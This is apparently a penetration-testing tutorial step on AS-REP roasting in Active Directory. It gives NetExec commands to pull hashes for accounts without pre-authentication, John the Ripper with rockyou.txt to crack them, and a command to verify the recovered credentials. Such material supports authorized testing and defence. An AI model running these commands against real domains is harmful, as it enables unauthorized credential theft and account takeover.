# 1.4.1 AsRepRoasting NetExec

In this step, the attacker tries to identify accounts that have pre-authentication disabled and request their AS-REP response. If such accounts exist, NetExec will return hashes that can be cracked offline.

For requesting AS-REP hashes from the domain using valid credentials:

```bash
nxc ldap <DOMAIN_IP> -u '<USERNAME>' -p '<PASSWORD>' --asreproast hash.txt
```

This command connects to the LDAP service of the Domain Controller and attempts AS-REP roasting. If successful, the hashes are saved into `hash.txt` for further cracking.

## Crack AS-REP Hashes

Once the hashes are collected, the next step is to crack them offline using a wordlist. This allows the attacker to recover the user’s plaintext password.

For cracking the extracted hashes using John the Ripper:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

This command uses the `rockyou.txt` wordlist to attempt password cracking. If the password is weak, it will be revealed.

***

## Verify Credentials

After successfully cracking the password, it is important to verify whether the credentials are valid in the domain. This ensures that the attack was successful and the account can be used for further access.

For verifying the username and password:

```bash
nxc ldap <DOMAIN_IP> -u <USER.NAME> -p <PASSWORD>
```

If authentication is successful, it confirms valid domain credentials.
